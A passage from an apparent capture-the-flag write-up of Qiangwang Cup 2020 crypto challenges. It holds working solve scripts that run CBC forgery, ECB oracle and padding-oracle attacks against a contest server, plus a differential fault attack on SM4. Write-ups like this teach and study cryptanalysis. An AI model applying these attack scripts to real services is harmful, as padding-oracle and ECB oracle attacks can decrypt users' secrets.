class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, re, random</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify, hexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"139.224.254.172"</span>, <span class="string">"7777"</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passpow</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    prefix = re.findall(<span class="string">r"\((.*)\+"</span>,msg)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        answer = <span class="string">''</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>))</span><br><span class="line">        cipher = sha256((prefix + answer).encode()).digest()</span><br><span class="line">        <span class="keyword">if</span> cipher[<span class="number">0</span>] &lt; <span class="number">8</span>:</span><br><span class="line">            io.sendlineafter(<span class="string">"?="</span>, answer)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    io.sendlineafter(<span class="string">"teamtoken="</span>, <span class="string">"icq6c57ba701346474cd670a5f3b1c66"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal1</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"[+] cookie:"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    cookie = re.findall(<span class="string">r"^(.*);checksum=(.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    session, checksum = cookie[<span class="number">0</span>], cookie[<span class="number">1</span>]</span><br><span class="line">    session = session.encode()</span><br><span class="line">    checksum = unhexlify(checksum)</span><br><span class="line">    payload = session[<span class="number">-16</span>:<span class="number">-1</span>] + <span class="string">b'1'</span></span><br><span class="line">    checksum = hexlify(xor(xor(payload, checksum[<span class="number">-32</span>:<span class="number">-16</span>]), session[<span class="number">-16</span>:]) + checksum[<span class="number">-16</span>:]).decode()</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] cookie:"</span>, session[:<span class="number">-1</span>].decode() + <span class="string">"1;checksum="</span> + checksum)</span><br><span class="line">    print(<span class="string">"[+] challenge-1 pass"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal2</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    iv_hash = re.findall(<span class="string">r"\(iv\)=(.*)"</span>, msg)[<span class="number">0</span>] <span class="comment"># sha256(iv).hexdigest()</span></span><br><span class="line">    <span class="comment"># ct = hexlify(b'\x00' * 32).decode()</span></span><br><span class="line">    ct = <span class="string">b'\x00'</span> * <span class="number">32</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] c:"</span>, ct)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    pt = re.findall(<span class="string">r"\[\+\] (.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    pt = unhexlify(pt)</span><br><span class="line">    iv = xor(pt[:<span class="number">16</span>], pt[<span class="number">16</span>:])</span><br><span class="line">    <span class="keyword">assert</span>(sha256(iv).hexdigest() == iv_hash)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] iv(encode hex):"</span>, hexlify(iv))</span><br><span class="line">    print(<span class="string">"[+] challenge-2 pass"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal3</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"[+] cookie="</span>)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    cookie = io.recvline().strip()</span></span><br><span class="line"><span class="string">    for i in range(0, len(cookie), 16):</span></span><br><span class="line"><span class="string">        print(cookie[i:i+16])</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    io.recvuntil(<span class="string">"[+] 128bit_ecb_encrypt(cookie):"</span>)</span><br><span class="line">    cookie = unhexlify(io.recvline().strip())</span><br><span class="line">    cookie = cookie[:<span class="number">16</span>*<span class="number">2</span>] + cookie[<span class="number">16</span>*<span class="number">4</span>:<span class="number">16</span>*<span class="number">5</span>] + cookie[<span class="number">16</span>*<span class="number">3</span>:]</span><br><span class="line">    cookie = hexlify(cookie)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] input your encrypted cookie(encode hex):"</span>, cookie)</span><br><span class="line">    print(<span class="string">"[+] challenge-3 pass"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal4_enc</span><span class="params">(m)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] input(encode hex):"</span>, hexlify(m))</span><br><span class="line">    io.recvuntil(<span class="string">"[+] encrypted msg: "</span>)</span><br><span class="line">    c = unhexlify(io.recvline().strip())</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal4</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    secret_hash = re.findall(<span class="string">r"\(secret\)=(.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    secret = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">15</span>, <span class="number">-1</span>, <span class="number">-1</span>)):</span><br><span class="line">        prefix = <span class="string">b"\x00"</span> * i</span><br><span class="line">        cipher = chal4_enc(prefix)[:<span class="number">16</span>]</span><br><span class="line">        mt = <span class="string">b""</span></span><br><span class="line">        <span class="keyword">for</span> lsb <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">            mt += (prefix + secret + bytes([lsb]))</span><br><span class="line">        ct = chal4_enc(mt)[:<span class="number">16</span>*<span class="number">0xff</span>]</span><br><span class="line">        <span class="keyword">for</span> lsb <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">            <span class="keyword">if</span> ct[<span class="number">16</span>*lsb:<span class="number">16</span>*(lsb+<span class="number">1</span>)] == cipher:</span><br><span class="line">                secret += bytes([lsb])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    <span class="keyword">assert</span>(sha256(secret).hexdigest() == secret_hash)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] secret(encode hex):"</span>, hexlify(secret))</span><br><span class="line">    print(<span class="string">"[+] challenge-4 pass"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal5_enc</span><span class="params">(m)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] input(encode hex):"</span>, hexlify(m))</span><br><span class="line">    io.recvuntil(<span class="string">"[+] myblockencrypt_ecb(your_input).encode(\"hex\"):"</span>)</span><br><span class="line">    c = unhexlify(io.recvline().strip())</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal5</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"5"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    secret_hash = re.findall(<span class="string">r"\(secret\)=(.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    io.recvuntil(<span class="string">"[+] myblockencrypt_ecb(secret).encode(\"hex\")="</span>)</span><br><span class="line">    secret_cipher = unhexlify(io.recvline().strip())</span><br><span class="line">    mt = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10000</span>):</span><br><span class="line">        mt += int.to_bytes(i, <span class="number">2</span>, <span class="string">"big"</span>)</span><br><span class="line">    <span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">    ct = chal5_enc(mt)</span><br><span class="line">    secret_list = [ct[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10000</span>)]</span><br><span class="line">    secret = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(secret_cipher), <span class="number">2</span>):</span><br><span class="line">        cur_secret = secret_list.index(secret_cipher[i:i+<span class="number">2</span>])</span><br><span class="line">        secret += int.to_bytes(cur_secret, <span class="number">2</span>, <span class="string">'big'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    <span class="keyword">assert</span>(sha256(secret).hexdigest() == secret_hash)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] secret(encode hex):"</span>, hexlify(secret))</span><br><span class="line">    print(<span class="string">"[+] challenge-5 pass"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal6_dec</span><span class="params">(c)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] input your iv+c (encode hex):"</span>, hexlify(c))</span><br><span class="line">    resp = io.recvline().strip().decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"success"</span> <span class="keyword">in</span> resp:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal6</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"6"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"[+] iv+aes128_cbc(key,iv,padding(secret)):"</span>)</span><br><span class="line">    msg = unhexlify(io.recvline().strip())</span><br><span class="line">    iv, cipher = msg[:<span class="number">16</span>], msg[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    secret = b''</span></span><br><span class="line"><span class="string">    for i in range(16):</span></span><br><span class="line"><span class="string">        for j in tqdm(range(0x100)):</span></span><br><span class="line"><span class="string">            ct = iv[:15-i] + bytes([j]) + iv[16-i:] + cipher</span></span><br><span class="line"><span class="string">            if chal6_dec(ct) == True:</span></span><br><span class="line"><span class="string">                secret = bytes([iv[-i - 1] ^ j ^ (i + 1)]) + secret</span></span><br><span class="line"><span class="string">                iv = iv[:15-i] + xor(ct[15-i:16], bytes([(i + 1) ^ (i + 2)]) * (i + 1))</span></span><br><span class="line"><span class="string">                break</span></span><br><span class="line"><span class="string">        print(secret)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    secret = <span class="string">b'\xe6?\xee\x07\xa3\x07\xaa\xc8\x8em\xb5\xa0\x90'</span></span><br><span class="line">    iv = iv[:<span class="number">16</span>-len(secret)] + xor(iv[<span class="number">16</span>-len(secret):], xor(secret, bytes([len(secret) + <span class="number">1</span>]) * len(secret)))</span><br><span class="line">    <span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(secret), <span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> tqdm(range(<span class="number">0x100</span>)):</span><br><span class="line">            ct = iv[:<span class="number">15</span>-i] + bytes([j]) + iv[<span class="number">16</span>-i:] + cipher</span><br><span class="line">            <span class="keyword">if</span> chal6_dec(ct) == <span class="literal">True</span>:</span><br><span class="line">                secret = bytes([iv[-i - <span class="number">1</span>] ^ j ^ (i + <span class="number">1</span>)]) + secret</span><br><span class="line">                iv = iv[:<span class="number">15</span>-i] + xor(ct[<span class="number">15</span>-i:<span class="number">16</span>], bytes([(i + <span class="number">1</span>) ^ (i + <span class="number">2</span>)]) * (i + <span class="number">1</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        print(secret)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] secret(encode hex):"</span>, hexlify(secret))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    passpow()</span><br><span class="line">    chal1()</span><br><span class="line">    chal2()</span><br><span class="line">    chal3()</span><br><span class="line">    chal4()</span><br><span class="line">    chal5()</span><br><span class="line">    chal6()</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"7"</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/Snipaste_2020-08-24_13-54-28.png" alt></p><h3 id="fault"><a href="#fault" class="headerlink" title="fault"></a>fault</h3><h4 id="题解分析-1"><a href="#题解分析-1" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><h5 id="SM4加密原理"><a href="#SM4加密原理" class="headerlink" title="SM4加密原理"></a>SM4加密原理</h5><p>SM4明文长度128bits，分为4个32bits的字$X_{0},X_{1},X_{2},X_{3}$，进行32轮加密，每轮的示意图如下：</p><p><img src= "/img/loading.gif" data-src="/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/Snipaste_2020-08-24_14-00-26.png" alt></p><p>其中SM4的S盒均相同，线性变换L为<code>lambda y:(y ^^ (rotl(y, 2)) ^^ (rotl(y, 10)) ^^ (rotl(y, 18)) ^^ (rotl(y, 24)))</code></p><p>抽象成1*32矩阵与32*32矩阵相乘的变换即可，发现该32*32的系数矩阵可逆，即L可逆（注意转置系数矩阵，且要在GF(2)下）</p><p>第32轮加密后，要实现一次$X_{32},X_{33},X_{34},X_{35}$四字的逆序，即C=($X_{35},X_{34},X_{33},X_{32}$)</p><h5 id="SM4密钥扩展"><a href="#SM4密钥扩展" class="headerlink" title="SM4密钥扩展"></a>SM4密钥扩展</h5><p>系统参数$FK=(FK_{0},FK_{1},FK_{2},FK_{3}),FK_{i}\in F_{2}^{32}$及$CK=(CK_{0},CK_{1}…,CK_{31}),CK_{i}\in F_{2}^{32}$固定</p><p>密钥为$(MK_{0},MK_{1},MK_{2},MK_{3})$，则初始化</p><p>$(K_{0},K_{1},K_{2},K_{3})=(MK_{0}\oplus FK_{0},MK_{1}\oplus FK_{1},MK_{2}\oplus FK_{2},MK_{3}\oplus FK_{3})$</p><p>迭代$rk_{i}=K_{i+4}=K_{i}\oplus T(K_{i+1}\oplus K_{i+2}\oplus K_{i+3}\oplus CK_{i}),i=0,1,…,31$</p><p>即可获得完整的32个轮密钥$rk_{i}$</p><p>(T函数与SM4加密轮函数中的S+L基本类似，只需将L改作<code>lambda y:(y ^^ (rotl(y, 13)) ^^ (rotl(y, 23))</code>即可)</p><h5 id="SM4故障差分分析"><a href="#SM4故障差分分析" class="headerlink" title="SM4故障差分分析"></a>SM4故障差分分析</h5><p>基于能在SM4的某轮轮函数中注入错误，挺有意思的攻击- -</p><p>攻击流程如下：</p><ul><li>选择随机明文，发送至服务端进行加密，拿到返回的ct</li><li>选择和上一步相同的明文，但在某轮注入错误，获取返回的ct_ast，同时也记录密文差分ct_diff</li><li>降轮次的常规差分攻击or直接对S盒的差分攻击</li></ul><p>由于本题中的出错轮次(0~31)，出错字节下标(0~15)，出错字节异或上的fault(0~0xfe)均可控</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">self.send(<span class="string">b"give me the value of r f p"</span>, <span class="literal">False</span>)</span><br><span class="line">tmp = self.recv(prompt=<span class="string">b":"</span>)</span><br><span class="line">r, f, p = tmp.split(<span class="string">b" "</span>)</span><br><span class="line">r = int(r) % <span class="number">0x20</span></span><br><span class="line">f = int(f) % <span class="number">0xff</span></span><br><span class="line">p = int(p) % <span class="number">16</span></span><br><span class="line">ct = self.encrypt2(key, unhexlify(pt), r, f, p)</span><br></pre></td></tr></table></figure><p>因此我们可以直接将其转化为对单个S盒的差分攻击（常规差分攻击基于高概率差分特征，爆破key部分比特观察counter来实现，但对于单个S盒的差分攻击则只需求交集即可）</p><p><strong>且在对于单个S盒的差分攻击中，若固定输入差分或输出差分其中任一者，均只能至多将key候选降至2个，想要确定唯一的key，则必须有至少两个输出差分来进行共同差分分析取key交集</strong></p><p>也正是因为这一点，我们要破解key[31]，所选注入fault的地方应为第29轮的第16个字节，且要注入两次不同错误来共同分析（比如当我们选择第31轮出错时，由于题目只允许在每一轮的后四个字节之一出错，因此无法篡改X31’，其值将固定为0x00000000）</p><p><img src= "/img/loading.gif" data-src="/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/Snipaste_2020-08-24_18-01-26.png" alt></p><p>在第29轮注入fault（假设为0x22）后，</p><p>可以发现第29轮的差分为0x00000000, 0x00000000, 0x00000000, 0x00000022</p><p>则第32轮的输出差分为$X31’\oplus X35’$，输入差分为$X32’\oplus X33’\oplus X34’$，且ct_diff对应的ct和ct_ast也均已知，逆L模块后对S盒进行差分攻击即可</p><p>上述攻击成功后，会令K[31]留下两个candidate，此时再注入fault=0x33，重复操作即可唯一确定K[31]</p><p>得到K[31]后，我们可对攻击K[31]时的所有密文数据进行一轮解密，得到31轮加密后的结果及加密差分，类似对S盒进行差分分析，直到恢复出K[30]和K[29]</p><p>但由于SM4的密钥生成算法，至少需要四个连续K，才能恢复出完整32个子密钥，因此我们对26轮第16个字节注入错误0x22和0x33，并利用已得到的K[29:32]进行解密得到第29轮加密后的结果及加密差分，此时情况已等价于求解K[31]</p><p>恢复出子密钥K[28:32]后，逆向得到32个子密钥，解密得到flag</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><p><strong>Exp被我写的极其冗余…凑合看8</strong></p><p><code>get_data.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, re</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"39.101.134.52"</span>, <span class="string">"8006"</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    suffix = re.findall(<span class="string">r"XXX\+([^\)]+)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    cipher = re.findall(<span class="string">r"== (.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode(<span class="string">"latin-1"</span>)).hexdigest() ==</span><br><span class="line">                        cipher, string.ascii_letters + string.digits, length=<span class="number">3</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Give me XXX:"</span>, proof)</span><br><span class="line">    io.sendlineafter(<span class="string">"teamtoken:"</span>, <span class="string">"icq6c57ba701346474cd670a5f3b1c66"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_enc_flag</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvline()</span><br><span class="line">    enc_flag = io.recvline().strip().decode()</span><br><span class="line">    <span class="keyword">return</span> enc_flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'your plaintext in hex:'</span>, hexlify(m))</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    c = re.findall(<span class="string">r"your ciphertext in hex:(.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject_fault</span><span class="params">(m, r, f, p)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'your plaintext in hex:'</span>, hexlify(m))</span><br><span class="line">    io.sendlineafter(<span class="string">'give me the value of r f p:'</span>, <span class="string">'&#123;&#125; &#123;&#125; &#123;&#125;'</span>.format(r, f, p))</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    c = re.findall(<span class="string">r"your ciphertext in hex:(.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    enc_flag = get_enc_flag()</span><br><span class="line">    r, f, p = <span class="number">29</span>, <span class="number">0x22</span>, <span class="number">15</span></span><br><span class="line">    fw = open(<span class="string">'data'</span>, <span class="string">'w'</span>)</span><br><span class="line">    fw.write(enc_flag + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="comment"># prepared for rk[29], rk[30], rk[31]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">5</span>)):</span><br><span class="line">        m = int.to_bytes(getRandomNBitInteger(<span class="number">128</span>), <span class="number">16</span>, <span class="string">'big'</span>)</span><br><span class="line">        c = encrypt(m)</span><br><span class="line">        c_ast = inject_fault(m, r, f, p)</span><br><span class="line">        c_diff = hexlify(xor(unhexlify(c), unhexlify(c_ast))).decode()</span><br><span class="line">        fw.write(<span class="string">'(&#123;&#125;,&#123;&#125;,&#123;&#125;)\n'</span>.format(c, c_ast, c_diff))</span><br><span class="line">    f = <span class="number">0x33</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">5</span>)):</span><br><span class="line">        m = int.to_bytes(getRandomNBitInteger(<span class="number">128</span>), <span class="number">16</span>, <span class="string">'big'</span>)</span><br><span class="line">        c = encrypt(m)</span><br><span class="line">        c_ast = inject_fault(m, r, f, p)</span><br><span class="line">        c_diff = hexlify(xor(unhexlify(c), unhexlify(c_ast))).decode()</span><br><span 